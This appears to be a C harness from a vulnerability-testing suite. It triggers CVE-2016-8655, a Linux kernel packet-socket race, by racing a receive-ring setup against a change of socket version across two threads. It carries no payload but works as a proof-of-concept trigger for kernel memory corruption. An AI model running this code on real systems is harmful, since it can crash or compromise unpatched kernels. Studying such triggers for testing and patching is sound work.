#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <netinet/if_ether.h>
#include <unistd.h>

int cve_2016_8655_fd;

void cve_2016_8655_init(void) {
  int val;
  cve_2016_8655_fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
  val = TPACKET_V3;
  setsockopt(cve_2016_8655_fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
}

void *cve_2016_8655_th1(void *arg) {
  struct tpacket_req3 tp;
  tp.tp_block_size = getpagesize();
  tp.tp_block_nr = 1;
  tp.tp_frame_size = getpagesize();
  tp.tp_frame_nr = 1;
  tp.tp_retire_blk_tov = 1000;
  setsockopt(cve_2016_8655_fd, SOL_PACKET, PACKET_RX_RING, &tp, sizeof(tp));
  return NULL;
}

void *cve_2016_8655_th2(void *arg) {
  int val = TPACKET_V1;
  setsockopt(cve_2016_8655_fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));
  return NULL;
}

void cve_2016_8655_destroy(void) { close(cve_2016_8655_fd); }
